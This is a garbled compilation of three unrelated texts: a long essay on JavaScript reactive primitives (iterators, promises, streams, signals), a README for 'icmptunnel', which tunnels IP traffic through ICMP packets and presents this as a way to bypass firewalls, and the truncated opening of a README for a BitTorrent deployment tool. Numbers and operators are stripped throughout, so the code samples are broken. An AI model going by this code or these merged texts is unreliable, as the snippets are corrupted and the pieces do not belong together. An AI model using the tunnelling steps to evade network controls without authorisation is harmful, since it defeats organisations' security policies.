current time is always changing it would not be meaningful much less possible to respond every moment it changes time series data comes in two varieties discrete and continuous discrete values should be pushed whereas continuous values should be pulled or polled if a homophone is a disaster what are synonymous homophones the current time or temperature are examples of continuous behaviors animation frames and morse code are examples of discrete signals let us consider each primitive in detail since the temporal primitives have spatial analogies and since some of these spatial primitives are relatively new to javascript we will review these first an iterator is an object that allows us to lazily but synchronously consume multiple values iterators are not new to javascript but there is a new standard forming at time of writing iterators implement a next method that returns an object that may have a value property and may have a done property although the standard does not give this object a name we will call it an iteration if the iterator has produced the entirety of a sequence the done property of the iteration will be true generator functions return iterators that expand on this basic definition the value of a non final iteration corresponds to a yield expression and the value of a done iteration corresponds to a return expression iterators are an interface with many implementations the canonical iterator yields the values from an array var iterator iterate    var iteration iterator next expect iteration value tobe  iteration iterator next expect iteration value tobe  iteration iterator next expect iteration value tobe  iteration iterator next expect iteration done tobe true what distinguishes an iterator from an array is that it is lazy an iterator does not necessarily end we can have iterators for non terminating sequences like counting or the fibonacci sequence the range function produces a sequence of values within an interval and separated by a stride function range start stop step return next function var iteration if start stop iteration value start start and step else iteration done true  return iteration if the stop value of the range is infinity  the iterator will have no end and will never produce a done iteration unlike an array an indefinite iterator consumes no more memory than an empty var iterator range  infinity  expect iterator next value tobe  expect iterator next value tobe  expect iterator next value tobe  the eager equivalent would produce an array but would only work for bounded intervals since it must create an exhaustive collection in memory before returning function range start stop step var result while start stop result push start start and step return result expect range    toequal    iterators may have alternate implementations of some methods familiar from for example foreach would walk the iterator until it is exhausted map would produce a new iterator of values passed through some transform while filter would produce a new iterator of the values that pass a test an iterator can support reduce  which would exhaust the iteration but reduceright would be less sensible since iterators only walk forward iterators may also have some methods that are unique to their character like dropwhile and takewhile we can save time and space by implementing pipelines with iterators instead of the following example can be interpreted as either eager or lazy depending on whether range returns an array or an iterator if we start with an array map will create another array of  values and filter will create another large array if we start with an iterator we will never construct an array of any size instead percolating one value at a time as the reducer pulls them from the filter as the filter pulls them from the mapping and as the mapping pulls them from the range range    map function n return n  filter function n return n   reduce function a b return a and b consider the eager and lazy range function implementations we lose a certain clarity when we convert the array range maker into an iterator range maker generator functions alleviate this problem by offering a way to express iterations procedurally with a lazy behavior a javascript engine near you may already support generator functions the syntax consists of adding an asterisk to the function declaration and using yield to produce iterations calling a generator function does not execute the function but instead sets up a state machine to track where we are in the function and returns an iterator whenever we ask the iterator for an iteration the state machine will resume the execution of the function until it produces an iteration or terminates function range start stop step while start stop yield start start and step var iterator range  infinity  expect iterator next value tobe  expect iterator next value tobe  expect iterator next value tobe  notice that the range generator function restores and perhaps even exceeds the clarity of the range array maker calling next has three possible outcomes if the iterator encounters a yield  the iteration will have a value if the iterator runs the function to either an express or implied return  the iteration will have a value and done will be true if the iterator runs to an explicit return this terminal iteration carries the return value if the generator function throws an error this will propagate out of next generators and iterators are unicast the consumer expects to see every value from the producer since generators and iterators cooperate information flows both forward as values and backward as requests for more values however the consumer can send other information back to the producer the next method familiar from basic iterators gains the ability to determine the value of the yield expression from which the generator resumes as a trivial example consider a generator that echoes whatever the consumer requests function echo var message while true console log tick message yield message console log tock var iterator echo console log iterator next and and value undefined done false console log iterator next hello and and value hello  done false console log iterator next goodbye and and value goodbye  done false we must prime the generator because it does not begin with a yield we advance the state machine to the first yield and allow it to produce the initial undefined message and halts at the yield expression we then send a hello this resumes the generator storing the message continuing into another iterator retreiving the same message yielding it back to the caller this communication back and forth between the consumer and producer foreshadows the ability of stream readers to push back on stream writers additionally the iterator gains a throw method that allows the iterator to terminate the generator by causing the yield expression to raise the given the error will unravel the stack inside the generator if the error unravels a try catch finally block the catch block may handle the error leaving the generator in a resumable state if the returned iteration is not done if the error unravels all the way out of the generator it will pass into the stack of the throw caller the iterator also gains a return method that causes the generator to resume as if from a return statement regardless of whether it actually paused at a yield expression like a thrown error this unravels the stack executing finally blocks but not catch blocks as such like next  the throw and return methods may either return an iteration done or not or throw an error this foreshadows the ability of a stream reader to prematurely stop a stream iterator throw new error do not want note that in java iterators java iterator have a hasnext method this is not implementable for generators owing to the halting problem the iterator must try to get a value from the generator before the generator can conclude that it cannot produce another value there is no proposal for a standard generator but for the sake of completeness if an array iterator consumes an array an array generator would lazily produce an array generator object would implement yield as a method with behavior analogous to the same keyword within a generator function the yield method would add a value to the array var array var generator generate array generator yield  generator yield  generator yield  expect array toequal    since ecmascript  at doug crockford s behest javascript allows keywords to be used for property names making this parallel between keywords and methods possible a generator might also implement return and throw methods but a meaningful implementation for an array generator is a stretch of the imagination although an array generator is of dubious utility it foreshadows the interface of asynchronous generators for which meaningful implementations of return and throw methods are easier to obtain and go on to inform a sensible design for asynchronous generator functions the asynchronous analogue of a getter is a promise each promise has a corresponding resolver as its asynchronous setter collectively the promise and resolver are a deferred value the salient method of a promise is then  which creates a new promise for the result of a function that will eventually observe the value of the promise if a promise were plural the then method might be called map if you care to beg an esoteric distinction it might be called map if the observer returns a value and flatmap if the observer returns a promise the then method of a promise allows either var promiseforthirty promiseforten then function ten return ten and  promises can also have a done method that observes the value but does not return a promise nor captures the result of the observer again if a promise were plural the done method might be called foreach promiseforten done function ten the then method also supports a second function that would observe whether the input promise radiates an exception and there is a catch method to use as a shorthand if you are only interested in catching errors promise then onreturn onthrow promise catch onthrow at this point the design described here begins to differ from the standard promise proposed for ecmascript  arriving in browsers at time of writing the purpose of these differences is not to propose an alternative syntax but to reinforce the relationship between a promise and its conceptual neighbors a resolver is the singular analogue of a generator rather than yielding returning and throwing errors the resolver can only return or throw resolver return  resolver throw new error sorry please return during business hours with the standard promise a free resolve function is sufficient and ergonomic for expressing both of these methods resolver return promise is equivalent to resolve promise resolver return  is equivalent to resolve  or resolve promise resolve  since non promise values are automatically boxed in an already fulfilled promise resolver throw error is equivalent to resolve promise reject error in all positions resolve is the temporal analogue of return and reject is the temporal analogue of throw since promises as we know them today bridged the migration gap from ecmascript  to ecmascript  it was also necessary to use non keywords for method names a deferred value can be deferred further by resolving it with another promise this can occur either expressly through the resolver or implicitly by returning a promise as the result of a observer function var authenticated getusernamefromconsole then function username return promise all getuserfromdatabase username  getpasswordfromconsole then function user password if hash password user passwordhash throw new error can t authenticate because the password is invalid  the then method internally creates a new deferred returns the promise and later forwards the return value of the observer to the resolver this is a sketch of a then method that illustrates this adapter note that we create a deferred use the resolver and return the promise the adapter is responsible for catching errors and giving the consumer an opportunity to do further work or to recover promise prototype then function promisethen onreturn onthrow var self this var deferred promise defer var resolver deferred resolver this done function value if onreturn try resolver return onreturn value catch error resolver throw error  else resolver return value   function error if onthrow try resolver return onthrow value catch error resolver throw error  else resolver throw error  return deferred promise the standard promise does not reveal promise defer instead it is hidden by then and by the promise constructor which elects to hide the deferred object and the resolver object instead revealing the resolve and reject methods as free arguments to a setup function furthering the need to give these functions names that are not keywords var promise new promise function resolve reject and and with a promise information flows only from the first call to a resolver method to all promise observers whether they are registered before or after the resolution with a task information flows from the first call to a resolver method to the first call to an observer method regardless of their relative order but one kind of information can flow upstream the observer may unsubscribe with an error this is conceptually similar to throwing an error back into a generator from an iterator and warrants the same interface task throw new error never mind this interface foreshadows its plural analogue streams generator functions have existed in other languages like python for quite some time so folks have made some clever uses of them we can combine promises and generator functions to emulate asynchronous functions the key insight is a single concise method that decorates a generator creating an internal promise trampoline an asynchronous function returns a promise for the eventual return value or the eventual thrown error of the generator function however the function may yield promises to wait for intermediate values on its way to completion the trampoline takes advantage of the ability of an iterator to send a value from next to yield var authenticated promise async function var username yield getusernamefromconsole var user getuserfromdatabase username var password getpasswordfromconsole user password yield promise all user password if hash password user passwordhash throw new error can t authenticate because the password is invalid mark miller s implementation async of the async decorator is succinct and insightful we produce a wrapped function that will create a promise generator and proceed immediately each requested iteration has three possible outcomes yield return or throw yield waits for the given promise and resumes the generator with the eventual return stops the trampoline and returns the value all the way out to the promise returned by the async function if you yield a promise that eventually throws an error the async function resumes the generator with that error giving it a chance to recover promise async function async generate return function function resume verb argument var result try result generator verb argument catch exception return promise throw exception  if result done return result value else return promise return result value then donext dothrow   var generator generate apply this arguments var donext resume bind this next var dothrow resume bind this throw return donext as much as javascript legitimizes the async promise generators by supporting returning and throwing now that promises are part of the standard the powers that sit on the ecmascript standards committee are contemplating special async and await syntax for this case the syntax is inspired by the same feature of c var authenticate async function var username await getusernamefromconsole var user getuserfromdatabase username var password getpasswordfromconsole user password await promise all user password return hash password user passwordhash one compelling reason to support special syntax is that await may have higher precedence than the yield keyword async function addpromises a b return await a and await b by decoupling async functions from generator functions  javascript opens the door for async generator functions  foreshadowing a plural and temporal getter a standard form for readable streams consider an asynchronous queue with a conventional queue you must put a value in before you can take it out that is not the case for a promise queue just as you can attach an observer to a promise before it is resolved with a promise queue you can get a promise for the next value in order before that value has been given var queue new queue queue get then function value console log value queue put hello world likewise of course you can add a value to the queue before observing it var queue new queue queue put hello world queue get then function value console log value although promises come out of the queue in the same order their corresponding resolutions enter a promise obtained later may settle sooner than another the values you put in the queue may themselves be promises var queue new queue queue get then function console log resolves later queue get then function console log resolves sooner queue put promise delay  queue put a promise queue qualifies as an asynchronous collection specifically a collection of results values or thrown errors captured by promises the queue is not particular about what those values mean and is a suitable primitive for many more interesting tools and interface and and and and and and and and and and promisequeue and value and plural and temporal and and queue get and getter and plural and temporal and and queue put and setter and plural and temporal and the implementation of a promise queue is sufficiently succinct that there s no harm in embedding it here this comes from mark miller s concurrency strawman for ecmascript and is a part of the q library exported by the q and queue module internally a promise queue is an asynchronous linked list that tracks the head promise and tail deferred get advances the head promise and put advances the tail deferred module exports promisequeue function promisequeue if this instanceof promisequeue return new promisequeue var ends promise defer this put function value var next promise defer ends resolve head value tail next promise  ends resolve next resolve this get function var result ends promise get head ends promise ends promise get tail return result the implementation uses methods defined in a closure regardless of how this is accomplished it is important that it be possible to pass the free get function to a consumer and put to a producer to preserve the principle of least authority and the unidirectional flow of data from producer to consumer see the accompanying sketch of a promise queue implementation a promise queue does not have a notion of termination graceful or otherwise we will later use a pair of promise queues to transport iterations between streams semaphores are flags or signs used for communication and were precursors to telegraphs and traffic lights in programming semaphores are usually used to synchronize programs that share resources where only one process can use a resource at one time for example if a process has a pool of four database connections it would use a semaphore to manage that pool typically semaphores are used to block a thread or process from continuing until a resource becomes available the process will down the semaphore whenever it enters a region where it needs a resource and will up the semaphore whenever it exits that region the terminology goes back to raising and lowering flags you can imagine your process as being a train and a semaphore as guarding the entrance to a particular length of track your process stops at the gate until the semaphore goes up of course in a reactive program we don t block instead of blocking we return promises and continue when a promise resolves we can use a promise as a non blocking mutex for a single resource and a promise queue as a non blocking semaphore for multiple resources in this example we establish three database connections that are shared by a function that can be called to do some work with the first available connection we get the resource do our work and regardless of whether we succeed or fail we put the resource back in the pool var connections new queue connections put connecttodb connections put connecttodb connections put connecttodb function work return connections get then function db return workwithdb db finally function connections put db  consider another application you have a producer and a consumer both doing work asynchronously the producer periodically sending a value to the consumer to ensure that the producer does not produce faster than the consumer can consume we put an object between them that regulates their flow rate a buffer the buffer uses a promise queue to transport values from the producer to the consumer and another promise queue to communicate that the consumer is ready for another value from the producer the following is a sketch to that effect var outbound new promisequeue var inbound new promisequeue var buffer out next function value outbound put value value done false  return inbound get  return function value outbound put value value done true  return inbound get  throw function error outbound put promise throw error return inbound get  in yield function value inbound put value value done false  return outbound get  return function value inbound put value value done true  return outbound get  throw function error inbound put promise throw error return outbound get  this sketch uses the vernacular of iterators and generators but each of these has equivalent nomenclature in the world of streams in yield means  write in return means  close in throw means  terminate prematurely with an error out next means  read out throw means  abort or cancel with an error out return means  abort or cancel prematurely but without an error so a buffer fits in the realm of reactive interfaces a buffer has an asynchronous iterator which serves as the getter side it also has an asynchronous generator which serves as the setter dual the buffer itself is akin to an asynchronous plural value in addition to satisfying the requirements needed just to satisfy the triangulation between synchronous iterables and asynchronous promises it solves the very real world need for streams that support pressure to regulate the rate of flow and avoid over commitment an asynchronous iterator is a readable stream an asynchronous generator is a writable stream and stream and and and and and and and and and and promise buffer and value and plural and temporal and and promise iterator and getter and plural and temporal and and promise generator and setter and plural and temporal and a buffer has a reader and writer but there are implementations of reader and writer that interface with the outside world mostly files and sockets in the particular case of an object stream if we treat yield and next as synonyms the input and output implementations are perfectly symmetric this allows a single constructor to serve as both reader and writer also standard promises use the revealing constructor pattern exposing the constructor for the getter side the standard hides the promise defer constructor method behind the scenes only exposing the resolver as arguments to a setup function and never revealing the promise resolver deferred object at all similarly we can hide the promise buffer constructor and reveal the input side of a stream only as arguments to the output stream constructor var reader new stream function write close abort and and the analogous method to promise defer might be stream buffer  which would return an in out pair of entangled streams see the accompanying sketch of a stream implementation one very important kind of promise iterator lifts a spatial iterator into the temporal dimension so it can be consumed on demand over time in this sketch we just convert a synchronous next method to a method that returns a promise for the next iteration instead we use a mythical iterate function which would create iterators for all sensible javascript objects and delegate to the iterate method of anything else that implements it there is talk of using symbols in es to avoid recognizing accidental iterables as this new type of duck function promiseiterator iterable this iterator iterate iterable promiseiterator prototype next function return promise return this iterator next the conversion may seem superfluous at first however consider that a synchronous iterator might apart from implementing next  also implement methods analogous to array  like foreach  map  filter  and reduce likewise an asynchronous iterator might provide analogues to these functions lifted into the asynchronous realm the accompanying sketch of a stream constructor implements a method stream from  analogous to ecmascript  s own array from this function coerces any iterable into a stream consuming that iterator on this allows us for example to run an indefinite sequence of jobs counting from  doing four jobs at any time stream from iterator range  infinity foreach function n return promise delay  thenreturn n  null  for example asynchronous map would consume iterations and run jobs on each of those iterations using the callback however unlike a synchronous map  the callback might return a promise for its eventual result the results of each job would be pushed to an output reader resulting in another promise that the result has been consumed this promise not only serves to produce the corresponding output iteration but also serves as a signal that the job has completed that the output has been consumed and that the map can schedule additional work an asynchronous map would accept an additional argument that would limit the number of concurrent jobs promiseiterator map function value return promise return value and  delay  synchronous foreach does not produce an output collection or iterator however it does return undefined when it is done of course synchronous functions are implicitly completed when they return but asynchronous functions are done when the asynchronous value they return foreach returns a promise for undefined since streams are unicast  asynchronous foreach would return a task it stands to reason that the asynchronous result of foreach on a stream would be able to propagate a cancellation upstream stopping the flow of data from the producer side of course the task can be easily forked or coerced into a promise if it needs to be shared freely among multiple consumers var task reader foreach function n console log consumed  n return promise delay  then function console log produced  n var subtask task fork var promise promise return task like map it would execute a job for each iteration but by default it would perform these jobs in serial asynchronous foreach would also accept an additional argument that would expand the number of concurrent jobs in this example we would reach out to the database for  user records at any given time reader foreach function username return database getuser username then function user console log user lastmodified  null  asynchronous reduce would aggregate values from the input reader returning a promise for the composite value the reducer would have an internal pool of aggregated values when the input is exhausted and only one value remains in that pool the reducer would resolve the result promise if you provide a basis value as an argument this would be used to prime the the reducer would then start some number of concurrent aggregator jobs each consuming two values the first value would preferably come from the pool but if the pool is empty would come from the input the second value would come unconditionally from the input whenever a job completes the result would be placed back in the pool an asynchronous iterator would have additional methods like copy or pipe that would send iterations from this reader to another writer this method would be equivalent to using foreach to forward iterations and then to terminate the sequence iterator copy generator and and is equivalent to iterator foreach generator yield then generator return generator throw note that the promise returned by yield applies pressure on the foreach machine pushing ultimately back on the iterator it would have buffer which would construct a buffer with some capacity the buffer would try to always have a value on hand for its consumer by prefetching values from its producer if the producer is faster than the consumer this can help avoid round trip latency when the consumer needs a value from the producer just as it is useful to transform a synchronous collection into an iterator and an iterator into a reader it is also useful to go the other way an asynchronous iterator would also have methods that would return a promise for a collection of all the values from the source for example all  or in the case of readers that iterate collections of bytes or characters join or consider also that a reader may be a proxy for a remote reader a promise iterator be easily backed by a promise for a remote object function remotepromiseiterator promise this remoteiteratorpromise promise invoke iterate remotepromiseiterator prototype next function value return this remoteiteratorpromise invoke next var remotereader remotefilesystem invoke open  primes txt var reader new remotepromiseiterator remotereader reader foreach console log apart from then and done  promises provide methods like get  call  and invoke to allow promises to be created from promises and for messages to be pipelined to remote objects an iterate method should be a part of that protocol to allow values to be streamed on demand over any message channel a promise generator is analogous in all ways to a plain generator promise generators implement yield  return  and throw the return and throw methods both terminate the stream yield accepts a value they all return promises for an acknowledgement iteration from the consumer waiting for this promise to settle causes the producer to idle long enough for the consumer to process the data one can increase the number of promises that can be held in flight by a promise the buffer constructor takes a length argument that primes the acknowledgement queue allowing you to send that number of values before having to wait for the consumer to flush var buffer new buffer  function fibstream a b return buffer in yield a then function return fibstream b a and b fibstream   done return buffer out if the consumer would like to terminate the producer prematurely it calls the throw method on the corresponding promise iterator this will eventually propagate back to the promise returned by the generator s yield  return  or throw buffer out throw new error that s enough thanks jafar husain recently asked the ecmascript committee jh  whether generator functions and async functions were composable and if so how they should compose his proposal jh continues to evolve one key question is what type an async generator function would return we look to precedent a generator function returns an iterator a asynchronous function returns a promise should the asynchronous generator return a promise for an iterator an iterator for promises if iterator t means that an iterator implements next such that it produces iteration t  the next method of an iterator promise t would return an iteration promise t  which is to say iterations that carry promises for values there is another possibility an asynchronous iterator might implement next such that it produces promise iteration t rather than iteration promise t that is to say a promise that would eventually produce an iteration containing a value rather than an iteration that contains a promise for a value this is an iterator of promises yielding iteration promise t var iteration iterator next iteration value then function value return callback call thisp value this is a promise iterator yielding promise iteration t promiseiterator next then function iteration return callback call thisp iteration value promises capture asynchronous results that is they capture both the value and error cases if next returns a promise the error case would model abnormal termination of a sequence iterations capture the normal continuation or termination of a sequence if the value of an iteration were a promise the error case would capture inability to transport a single value but would not imply termination of the sequence in the context of this framework the answer is clear an asynchronous generator function uses both await and yield the await term allows the function to idle until some asynchronous work has settled and the yield allows the function to produce a value an asynchronous generator returns a promise iterator the output side of a recall that an iterator returns an iteration but a promise iterator returns a promise for an iteration and also a promise generator returns a similar promise for the acknowledgement from the iterator promiseiterator next then function iteration console log iteration value if iteration done console log fin promisegenerator yield alpha then function iteration console log iterator has consumed alpha the following example will fetch quotes from the works of shakespeare retrieve quotes from each work and push those quotes out to the consumer note that the yield expression returns a promise for the value to flush so awaiting on that promise allows the generator to pause until the consumer catches up async function shakespeare titles for let title of titles var quotes await getquotes title for let quote of quotes await yield quote  var reader shakespeare hamlet  macbeth  othello reader reduce function length quote return length and quote length   null  then function totallength console log totallength it is useful for await and yield to be completely orthogonal because there are cases where one will want to yield but ignore pressure from the consumer forcing the iteration to buffer jafar also proposes the existence of an on operator in the context of this framework the on operator would be similar to the ecmascript  of operator which accepts an iterable produces an iterator and then walks the iterator for let a of    console log a and and is equivalent to var aniterable    var aniterator aniterable symbol iterate while true let aniteration aniterator next if aniteration done break else var avalue aniteration value console log avalue the on operator would operate on an asynchronous iterable producing an asynchronous iterator and await each promised iteration look for the await in the following example for let a on anasynciterable console log a and and is equivalent to var anasynciterator anasynciterable symbol iterate while true var anasynciteration anasynciterator next var aniteration await anasynciteration if aniteration done break else var avalue aniteration value console log avalue one point of interest is that the on operator would work for both asynchronous and synchronous iterators and iterables since await accepts both values and promises jafar proposes that the asynchronous analogues of iterate would be observe generator  from which it is trivial to derrive foreach  but i propose that the asynchronous analogues of iterate would just be iterate and differ only in the type of the returned iterator what jafar proposes as the asynciterator observe asyncgenerator method is effectively equivalent to synchronous iterator copy generator or stream pipe stream in this framework copy would be implemented in terms of foreach stream prototype copy function stream return this foreach stream next then stream return stream throw and foreach would be implemented in terms of next  just as it would be layered on a synchronous iterator there is more than one way to solve the problem of processor contention or process over scheduling streams have a very specific contract that makes pressurization necessary specifically a stream is intended to transport the entirety of a collection and strongly resembles a spatial collection that has been rotated  degrees onto the temporal axis however there are other contracts that lead us to very different strategies to avoid over commitment and they depend entirely on the meaning of the data in the appropriate transport is domain specific consider a sensor like a thermometer or thermocouple at any given time the subject will have a particular temperature the temperature may change continuously in response to events that are not systematically observable suppose that you poll the thermocouple at one second intervals and place that on some plural asynchronous setter suppose that this ultimately gets consumed by a visualization that polls the corresponding plural asynchronous getter sixty times per second the visualization is only interested in the most recently sampled value from the consider a variable like the position of a scrollbar the value is discrete it does not change continuously rather it changes only in response to an observable event each time one of these scroll events occurs we place the position on the setter side of some temporal collection any number of consumers can subscribe to the getter side and it will push a notification their way however if we infer a smooth animation from the discrete scroll positions and their times we can sample the scroll position function on each animation these cases are distinct from streams and have interesting relationships with each other with the temperature sensor changes are continuous  whereas with the scroll position observer the changes are discrete with the temperature sensor we sample the data at a much lower frequency than the display in which case it is sufficient to remember the last sensed temperature and redisplay it if we were to sample the data at a higher frequency than the display it would be sufficient for the transport to forget old values each time it receives a new also unlike a stream these cases are both well adapted for multiple producer and multiple consumer scenarios also unlike streams one of these concepts pushes data and the other polls or pulls data a stream has pressure which is a kind of combined pushing and pulling data is pulled toward the consumer by a vacuum producers are pushed back by pressure when the vacuum is filled thus the term back pressure the discrete event pusher is a signal the continuous pollable is a behavior and interface and and and and and and and and signal observable and get and push and and signal generator and set and push and and signal and value and push and and behavior iterator and get and poll and and behavior generator and set and poll and and behavior and value and poll and todo make sure this is a summary of the topics in the end yet even behaviors have variations like probes gauges counters flow gauges accumulators flushable accumulators and rotating counters a signal represents a value that changes over time the signal is asynchronous and plural like a stream unlike a stream a signal can have multiple producers and consumers the output side of a signal is an observable a signal has a getter side and a setter side the asynchronous getter for a signal is an observable instead of a reader the observable implements foreach  which subscribes an observer to receive push notifications whenever the signal value changes signal out foreach function value time signal console log value the signal generator is the asynchronous setter like a stream writer it implements yield however unlike a stream writer yield does not return a promise signal in yield  signals do not support pressure just as yield does not return a promise the callback you give to foreach does not accept a promise a signal can only push the consumer or consumers cannot push back observables also implement next  which returns an iteration that captures the most recently dispatched value this allows us to poll a signal as if it were a behavior see the accompanying sketch of a observable implementation just as streams relate to buffers not every observable must be paired with a signal generator a noteworthy example of an external observable is a clock a clock emits a signal with the current time at a regular period and offset var tick new clock period  var tock new clock period  offset  tick foreach function time console log tick  time tock foreach function time console log tock  time see the accompanying sketch of a clock implementation signals may correspond to system or platform signals like keyboard or mouse input or other external sensors furthermore a signal generator might dispatch a system level signal to another process for example sighup which typically asks a daemon to reload its configuration daemon signals yield sighup a behavior represents a time series value a behavior may produce a different value for every moment in time as such they must be polled at an interval meaningful to the consumer since the behavior itself has no inherent resolution behaviors are analogous to observables but there is no corresponding setter since it produces values on demand the behavior constructor accepts a function that returns the value for a given an asynchronous behavior returns promises instead of values see the accompanying sketch of a behavior implementation imagine you are copying the values from a stream into an array you know how long the array will be and when you started reading knowing these variables and assuming that the rate of flow is steady you can infer the amount of progress that has been made up to the current time this is a simple matter of dividing the number of values you have so far received by the total number of values you expect to receive var progress index and length this is a discrete measurement that you can push each time you receive another it is discrete because it does not change between events you can also infer the average throughput of the stream also a discrete time series var elapsed now start var throughput index and elapsed from progress you can divine an estimated time of completion this will be the time you started plus the time you expect the whole stream to var stop start and elapsed and progress var stop start and elapsed and index and length var stop start and elapsed length and index we could update a progress bar whenever we receive a new value but frequently we would want to display a smooth animation continuously changing ideally progress would proceed linearly from  at the start time to  at the stop time you could sample progress at any moment in time and receive a different value values that lack an inherent resolution are continuous it becomes the responsibility of the consumer to determine when to sample pull or poll the value for the purposes of a smooth animation of a continuous behavior the frame rate is a sensible polling frequency we can infer a continuous progress time series from the last known estimated time of completion var progress now start and estimate start reactive primitives can be categorized in multiple dimensions the interfaces of analogous non reactive constructs including getters setters and generators are insightful in the design of their asynchronous counterparts identifying whether a primitive is singular or plural also greatly informs the we can use pressure to deal with resource contention while guaranteeing consistency we can alternately use push or poll strategies to skip irrelevant states for either continuous or discrete time series data with behaviors or signals there is a tension between cancelability and robustness but we have primitives that are useful for both cases streams and tasks are inherently cooperative cancelable and allow bidirectional information flow promises guarantee that consumers and producers cannot interfere all of these concepts are related and their implementations benefit from mutual availability promises and tasks are great for single result data but can provide a convenient channel for plural signals and behaviors bringing all of these reactive concepts into a single framework gives us an opportunity to tell a coherent story about reactive programming promotes a better understanding about what tool is right for the job and obviates the debate over whether any single primitive is a silver bullet there are many more topics that warrant discussion and i will expand upon these reservoir sampling can be modeled as a behavior that watches a stream or signal and produces a representative sample on demand a clock user interface is a good study in the interplay between behaviors signals time and animation scheduling drawing from my experience at fastsoft we exposed variables from the kernel s networking stack so we could monitor the bandwidth running through our tcp acceleration appliance some of those variables modeled the number of packets transmitted and the number of bytes transmitted these counters would frequently overflow there are several interesting ways to architect a solution that would provide historical data in multiple resolutions accounting for the variable overflow involving a combination of streams behaviors and signals i should draw your attention to design aspects of rrdtool an advantage of having a unified framework for reactive primitives is to create simple stories for passing one kind of primitive to another promises can be coerced to tasks tasks to promises a signal can be used as a behavior and a behavior can be captured by a signal signals can be channeled into streams and streams can be channeled into it is worth exploring in detail how operators can be lifted in each of these value spaces implementing distributed sort using streams is also a worthy exercise asynchronous behaviors would benefit from an operator that solves the thundering herd problem the inverse of throttling how to implement type ahead suggestion is a great case to explore cancelable streams and tasks i also need to discuss how these reactive concepts can propagate operational transforms through queries using both push and pull styles and how this relates to bindings both synchronous and asynchronous i also need to compare and contrast publishers and subscribers to the related concepts of signals and streams in short publishers and subscribers are broadcast unlike unicast streams but a single subscription could be modeled as a stream however a subscriber can typically not push back on a publisher so how resource contention is alleviated is an open question related to publishing and subscribing streams can certainly be forked in which case both branches would put pressure back on the source streams also have methods that return tasks all of these could propagate estimated time to completion each of the cases for all  any  race  and read are worth exploring high performance buffers for bytewise data with the promise buffer interface require further exploration implementing a retry loop with promises and tasks is illustrative reactive extensions rx beg a distinction between hot and cold observables which is worth exploring the clock reference implementation shows one way to implement a signal that can be active or inactive based on whether anyone is looking the research into continuous behaviors and the original idea of functional reactive programming by conal elliott deserves attention the interplay between promises and tasks with their underlying progress behavior and estimated time to completion and status signals require further explanation these ideas need to be incorporated into the sketches of promise and task implementations accumulator array asynchronous await behavior blocking broadcast buffer cancelable continuous control counter deferred discrete flow gauge future gauge getter getter getter iterable iterator multiple non blocking observable observer operation pressure probe promise publisher pulse readable result retriable sensor setter setter setter signal single spatial stream strobe subscriber synchronous temporal throttle unicast value writable yield i am grateful to domenic denicola ryan paul and kevin smith for reviewing and providing

41328612, transparently tunnel your ip traffic through icmp echo and reply packets icmptunnel works by encapsulating your ip traffic in icmp echo packets and sending them to your own proxy server the proxy server decapsulates the packet and forwards the ip traffic the incoming ip packets which are destined for the client are again encapsulated in icmp reply packets and sent back to the client the ip traffic is sent in the data field of icmp packets so basically the client machine uses only the icmp protocol to communicate with the proxy server applications running on the client machine are oblivious to this fact and work seamlessly  bypassing firewalls firewalls are set up in various networks to block certain type of traffic icmptunnel can be used to bypass such firewall rules obfuscating the data payload can also be helpful to bypass some firewalls  encrypted communication channel adding sufficient encryption to the data icmptunnel can be used to establish an encrypted communication channel between two host machines  a posix compliant host with root access that will be communicating with only icmp protocol this will be the client  a posix compliant host with root access with full access to the internet this will act as our proxy server  the proxy server should be accessible from the client host note although icmptunnel has been successfully tested on ubuntu   lts it should work on others as well   install make on both machines  clone this repository using this command  run make  on the server side run the tunnel with root privileges sudo and icmptunnel s      on the client side find out your gateway and the corresponding interface route n destination gateway genmask flags metric ref use iface             ug    eth edit client sh and replace server with the ip address of the proxy server gateway with gateway address obtained above and similarly for interface  check the dns server at client side make sure it does not use any server not accessible by our proxy server one suggestion is to use     google s dns server which will be accessible to the proxy server you would need to edit your dns settings for this you might need to manually delete the route for your local dns server from your routing table  run the tunnel on your client with root privileges sudo and icmptunnel c server the tunnel should run and your client machine should be able to access the internet all traffic will be tunneled through icmp icmptunnel works by creating a virtual tunnel interface say tun all the user traffic on the client host is routed to tun icmptunnel listens on this interface for ip packets these packets are encapsulated in an icmp echo packet i e the payload of the icmp packet is nothing but the original ip packet this newly generated icmp packet is sent outside the client machine to the proxy server through the restricted internet connection the proxy server receives these icmp packets and decapsulates the original ip packet this is retransmitted onto the internet after implementing ip masquerading hence the target believes that it s the proxy server making the request the target then responds back to the proxy server with an ip packet this is again captured by icmptunnel encapsulated in an icmp reply packet and send back to the client on the client side the ip packet is retrieved from the payload of the icmp reply packet and injected in tun the user applications read from this virtual interface and hence get the proper ip packet and and and and and and icmp traffic and and ip traffic and client and and proxy and and and and server and and and through restricted and and proper internet and and internet and and and and and and and and ip traffic and and ip traffic and and icmp traffic and user and and tun and and

through ifconfig route is used to change the routing tables of the client so as to route all traffic to the virtual tunnel interface dd is used to temporarily change the setting of ip forwarding and replying back to icmp requests on the side of the proxy server iptables is used to set up nat on the server side proxy server is connected to eth this interface provides full internet connection both the client and proxy server are connected to wlan a wifi hotspot this hotspot is configured not to provide any internet connection tun will be created in both the client and the proxy server  tun on client side the usual http request is visible along with response  wlan on client side all traffic is icmp the http and ip packet can be seen as part of the payload of the icmp packet  wlan on proxy server side the icmp packets sent by the client can be seen  tun on proxy server side the http and ip packets are decapsulated and sent through tun  eth on proxy server side the http and ip packets are forwarded to the internet notice how the source ip has been masqueraded because of nat
481811, murder by larry gadea lg twitter com and matt freels freels twitter com copyright   twitter inc warning this project though still functional is no longer maintained description  murder is a method of using bittorrent to distribute files to a large amount of servers within a production environment this allows for scaleable and fast deploys in environments of hundreds to tens of thousands of servers where centralized distribution systems wouldn t otherwise function a murder is normally used to refer to a flock of crows which in this case applies to a bunch of servers doing something for an intro video see quick start  for the impatient gem install murder and add these lines to your capfile require murder set deployvia murder after deploy setup  murder distributefiles before murder startseeding  murder starttracker after murder stopseeding  murder stoptracker how it works  in order to do a murder transfer there are several components required to be set up beforehand many the result of bittorrent nature of the system murder is based on bittornado a torrent tracker this tracker started by running the murdertracker py script runs a self contained server on one machine although technically this is still a centralized system everyone relying on this tracker  the communication between this server and the rest is minimal and normally acceptable to keep things simple tracker less distribution dht is currently not supported the tracker is actually just a mini httpd that hosts a and announce path which the bittorrent clients update their state onto a seeder this is the server which has the files that you d like to deploy onto all other servers the files are placed into a directory that a torrent gets created from murder will tgz up the directory and create a torrent file a very small file containing basic hash information about the tgz file this torrent file lets the peers know what they re downloading the tracker keeps track of which torrent files are currently being distributed once a murder 